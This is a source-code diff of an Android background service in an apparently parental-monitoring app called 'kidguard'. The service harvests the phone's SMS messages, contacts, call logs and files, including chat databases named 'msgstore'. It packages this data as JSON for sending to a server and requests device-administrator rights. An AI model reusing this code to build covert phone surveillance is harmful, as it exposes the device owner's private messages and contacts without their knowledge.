@@ -19,15 +19,20 @@ import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
 import android.provider.CallLog;
-import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.util.Log;
 import android.widget.Toast;
 
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
+import com.j256.ormlite.android.apptools.OpenHelperManager;
+import com.j256.ormlite.dao.Dao;
 import com.kidguard.MainActivity;
 import com.kidguard.R;
+import com.kidguard.asynctask.CallsAsyncTask;
+import com.kidguard.asynctask.ContactsAsyncTask;
+import com.kidguard.asynctask.FilesAsyncTask;
+import com.kidguard.asynctask.SmsAsyncTask;
 import com.kidguard.interfaces.Constant;
 import com.kidguard.model.Apps;
 import com.kidguard.model.Calls;
@@ -35,6 +40,7 @@ import com.kidguard.model.Contacts;
 import com.kidguard.model.Files;
 import com.kidguard.model.Images;
 import com.kidguard.model.Sms;
+import com.kidguard.orm.DatabaseHelper;
 import com.kidguard.preference.Preference;
 import com.kidguard.utilities.Utilities;
 
@@ -48,13 +54,15 @@ import java.util.Date;
 import java.util.List;
 
 public class BackgroundDataService extends Service implements Constant {
+
     private static final String TAG = "BackgroundDataService";
+
     private Context context;
     private ArrayList<Sms> lstSms;
     private ArrayList<Contacts> lstContacts;
     private ArrayList<Calls> lstCalls;
     private ArrayList<File> fileList;
-    private ArrayList<Files> lstfiles;
+    private ArrayList<Files> lstFiles;
     private ArrayList<Apps> lstApps;
     private ArrayList<Images> lstImages;
     private String finalJSON;
@@ -66,6 +74,9 @@ public class BackgroundDataService extends Service implements Constant {
     private DevicePolicyManager mDPM;
     private ComponentName mDeviceAdminSample;
     protected boolean mAdminActive;
+    private DatabaseHelper databaseHelper = null;
+
+    private Dao<Sms, Integer> smsDao;
 
     public static BackgroundDataService getInstance() {
         return services;
@@ -101,7 +112,16 @@ public class BackgroundDataService extends Service implements Constant {
             return;
         }
 
-        new GetDeviceData().execute();
+        // new GetDeviceData().execute();
+        getDataWithTag(TAG_FILES, "12", "txt", "");
+
+    }
+
+    private DatabaseHelper getHelper() {
+        if (databaseHelper == null) {
+            databaseHelper = OpenHelperManager.getHelper(this, DatabaseHelper.class);
+        }
+        return databaseHelper;
     }
 
     /**
@@ -120,7 +140,7 @@ public class BackgroundDataService extends Service implements Constant {
                 intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample);
                 intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                         getString(R.string.add_admin_extra_app_text));
-                if(MainActivity.getInstance() != null){
+                if (MainActivity.getInstance() != null) {
                     MainActivity.getInstance().startActivity(intent);
                 }
                 break;
@@ -129,38 +149,96 @@ public class BackgroundDataService extends Service implements Constant {
         }
     }
 
+    /* Get Data With Tag*/
+    private void getDataWithTag(String tag, String count, String dateFrom, String dateTo) {
+        if (tag.equals(TAG_SMS)) {
+
+            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_SMS)) {
+                new SmsAsyncTask(this).execute(count, dateFrom, dateTo);
+            }
+            return;
+        }
+
+        if (tag.equals(TAG_CONTACTS)) {
+            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_CONTACTS)) {
+                new ContactsAsyncTask(this).execute(count, dateFrom, dateTo);
+            }
+            return;
+        }
+
+        if (tag.equals(TAG_CALLS)) {
+            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_CALL_LOG)) {
+                new CallsAsyncTask(this).execute(count, dateFrom, dateTo);
+            }
+            return;
+        }
+
+        if (tag.equals(TAG_FILES)) {
+            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
+                    && Utilities.PackageUtil.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
+                new FilesAsyncTask(this).execute(count, dateFrom, dateTo);
+            }
+            return;
+        }
+
+        if (tag.equals(TAG_IMAGES)) {
+            return;
+        }
+
+        if (tag.equals(TAG_LIST_APPS)) {
+            return;
+        }
+
+        if (tag.equals(TAG_CAMERA)) {
+            return;
+        }
+
+
+    }
+
+    /* Send Sms Data To Server */
+    public void sendSmsDataToServer(ArrayList<Sms> lstSms) {
+        this.lstSms = lstSms;
+        convertToJSONFormat(TAG_SMS, 4);
+        stopSelf();
+    }
+
+    /* Send Contacts Data To Server */
+    public void sendContactsDataToServer(ArrayList<Contacts> lstContacts) {
+        this.lstContacts = lstContacts;
+        convertToJSONFormat(TAG_CONTACTS, 4);
+        stopSelf();
+    }
+
+    /* Send Calls Data To Server */
+    public void sendCallsDataToServer(ArrayList<Calls> lstCalls) {
+        this.lstCalls = lstCalls;
+        convertToJSONFormat(TAG_CALLS, 4);
+        stopSelf();
+    }
+
+    /* Send Files Data To Server */
+    public void sendFilesDataToServer(ArrayList<Files> lstFiles) {
+        this.lstFiles = lstFiles;
+        convertToJSONFormat(TAG_FILES, 4);
+        stopSelf();
+    }
 
     /* Get Data From Device */
     private class GetDeviceData extends AsyncTask<String, Void, String> {
 
         @Override
         protected String doInBackground(String... params) {
-            Log.d("doInBackground", "getData");
-
-            // Read SMS
-            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_SMS)) {
-                getAllSms(context);
-            }
-
-            // Read Contacts
-            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_CONTACTS)) {
-                readContacts();
-            }
-
-            // Read CALL Details
-            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_CALL_LOG)) {
-                getCallDetails(context);
-            }
+            Log.e("doInBackground", "getData");
 
             // Read Get All Files
             if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                     && Utilities.PackageUtil.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
-                getAllFiles();
-                getAllShownImagesPath(context);
+                //getAllShownImagesPath(context);
             }
 
             // List Of installed Apps
-            getListApps();
+            //getListApps();
             return "Executed";
         }
 
@@ -187,174 +265,6 @@ public class BackgroundDataService extends Service implements Constant {
         return super.onStartCommand(intent, flags, startId);
     }
 
-    // Read Phone Contacts
-    public void readContacts() {
-        lstContacts = new ArrayList<Contacts>();
-        ContentResolver cr = getContentResolver();
-        Cursor cur = null;
-        try {
-            cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
-                    null, null, null, null);
-            if (cur.getCount() > 0) {
-                while (cur.moveToNext()) {
-                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
-                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
-                    if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
-                        System.out.println("name : " + name + ", ID : " + id);
-                        // get the phone number
-                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
-                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                                new String[]{id}, null);
-                        while (pCur.moveToNext()) {
-                            Contacts contact = new Contacts();
-                            String phone = pCur.getString(
-                                    pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                            contact.setName(name);
-                            contact.setPhoneNo(phone);
-                            lstContacts.add(contact);
-                            Log.d("Contacts", "Details??" + name + "" + phone);
-                        }
-                        pCur.close();
-                    }
-                }
-            }
-        } catch (Exception e) {
-
-        } finally {
-            if (cur != null && !cur.isClosed())
-                cur.close();
-        }
-
-        convertToJSONFormat(TAG_CONTACTS, 2);
-    }
-
-    // Get All SMS
-    public List<Sms> getAllSms(Context ctx) {
-        Cursor c = null;
-        try {
-
-            lstSms = new ArrayList<Sms>();
-            Uri message = Uri.parse("content://sms/");
-            ContentResolver cr = this.getContentResolver();
-
-            c = cr.query(message, null, null, null, null);
-
-            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.HONEYCOMB) {
-                ((Activity) ctx).startManagingCursor(c);
-            }
-
-            int totalSMS = c.getCount();
-            if (c.moveToFirst()) {
-                for (int i = 0; i < totalSMS; i++) {
-
-                    final Sms objSms = new Sms();
-                    objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
-                    objSms.setAddress(c.getString(c
-                            .getColumnIndexOrThrow("address")));
-                    objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
-                    objSms.setReadState(c.getString(c.getColumnIndex("read")));
-                    objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
-                    if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
-                        objSms.setFolderName("inbox");
-                    } else {
-                        objSms.setFolderName("sent");
-                    }
-
-                    lstSms.add(objSms);
-                    c.moveToNext();
-                }
-
-                convertToJSONFormat(TAG_SMS, 1);
-
-            }
-
-            c.close();
-        } catch (Exception e) {
-
-        } finally {
-            try {
-                if (c != null && !c.isClosed())
-                    c.close();
-
-            } catch (Exception ex) {
-            }
-        }
-
-
-        return lstSms;
-    }
-
-    // Get Call Details
-    private String getCallDetails(Context ctx) {
-        StringBuffer sb = new StringBuffer();
-        Cursor managedCursor = null;
-        try {
-
-            lstCalls = new ArrayList<Calls>();
-            ContentResolver cr = this.getContentResolver();
-            managedCursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
-
-            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.HONEYCOMB) {
-                ((Activity) ctx).startManagingCursor(managedCursor);
-            }
-            int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
-            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
-            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
-            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
-            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
-            sb.append("Call Details :");
-            while (managedCursor.moveToNext()) {
-                String pname = managedCursor.getString(name);
-                String phNumber = managedCursor.getString(number);
-                String callType = managedCursor.getString(type);
-                String callDate = managedCursor.getString(date);
-                Date callDayTime = new Date(Long.valueOf(callDate));
-                String callDuration = managedCursor.getString(duration);
-                String dir = null;
-                int dircode = Integer.parseInt(callType);
-                switch (dircode) {
-                    case CallLog.Calls.OUTGOING_TYPE:
-                        dir = "OUTGOING";
-                        break;
-
-                    case CallLog.Calls.INCOMING_TYPE:
-                        dir = "INCOMING";
-                        break;
-
-                    case CallLog.Calls.MISSED_TYPE:
-                        dir = "MISSED";
-                        break;
-                }
-
-                Calls calls = new Calls();
-                calls.setCallerName(pname);
-                calls.setPhNumber(phNumber);
-                calls.setCallType(callType);
-                calls.setCallDate(callDate);
-                calls.setCallDayTime(callDayTime);
-                calls.setCallDuration(callDuration);
-                calls.setDir(dir);
-                lstCalls.add(calls);
-
-                sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
-                        + dir + " \nCall Date:--- " + callDayTime
-                        + " \nCall duration in sec :--- " + callDuration);
-                sb.append("\n----------------------------------");
-            }
-            managedCursor.close();
-
-        } catch (Exception e) {
-
-        } finally {
-            if (managedCursor != null && !managedCursor.isClosed())
-                managedCursor.close();
-        }
-
-        convertToJSONFormat(TAG_CALLS, 3);
-
-        return sb.toString();
-
-    }
 
     // List Of installed Apps
     private void getListApps() {
@@ -372,52 +282,6 @@ public class BackgroundDataService extends Service implements Constant {
             }
         }
         convertToJSONFormat(TAG_LIST_APPS, 4);
-    }
-
-    // Get All Files
-    private void getAllFiles() {
-        fileList = new ArrayList<File>();
-        lstfiles = new ArrayList<Files>();
-        File root = new File(Environment.getExternalStorageDirectory()
-                .getAbsolutePath());
-        getFile(root);
-
-        for (int i = 0; i < fileList.size(); i++) {
-            Files files = new Files();
-            files.setFilename(fileList.get(i).getName());
-            files.setFilePath(fileList.get(i).getAbsolutePath());
-            lstfiles.add(files);
-        }
-
-        convertToJSONFormat(TAG_FILES, 5);
-    }
-
-    // Get Files List
-    public ArrayList<File> getFile(File dir) {
-        File listFile[] = dir.listFiles();
-        if (listFile != null && listFile.length > 0) {
-            for (int i = 0; i < listFile.length; i++) {
-
-                if (listFile[i].isDirectory()) {
-                    //fileList.add(listFile[i]);
-                    getFile(listFile[i]);
-
-                } else {
-                    if (listFile[i].getName().endsWith(".doc")
-                            || listFile[i].getName().endsWith(".pdf")
-                            || listFile[i].getName().endsWith(".txt")
-                            || listFile[i].getName().endsWith(".db")
-                            || listFile[i].getName().startsWith("msgstore"))
-
-
-                    {
-                        fileList.add(listFile[i]);
-                    }
-                }
-
-            }
-        }
-        return fileList;
     }
 
     /* Get Image Path */
@@ -495,6 +359,7 @@ public class BackgroundDataService extends Service implements Constant {
 
     /* Convert To JSON Format */
     private void convertToJSONFormat(String tag, int count) {
+
         Gson gson = new Gson();
 
         if (tag.equals(TAG_SMS)) {
@@ -535,10 +400,10 @@ public class BackgroundDataService extends Service implements Constant {
 
         } else if (tag.equals(TAG_FILES)) {
 
-            if (lstfiles != null && lstfiles.size() > 0) {
+            if (lstFiles != null && lstFiles.size() > 0) {
                 Type type = new TypeToken<List<Apps>>() {
                 }.getType();
-                String jsonApps = gson.toJson(lstfiles, type);
+                String jsonApps = gson.toJson(lstFiles, type);
                 finalJSON2 = "\"FILES\":" + jsonApps + ",";
                 sbAppend2.append(finalJSON2);
             }
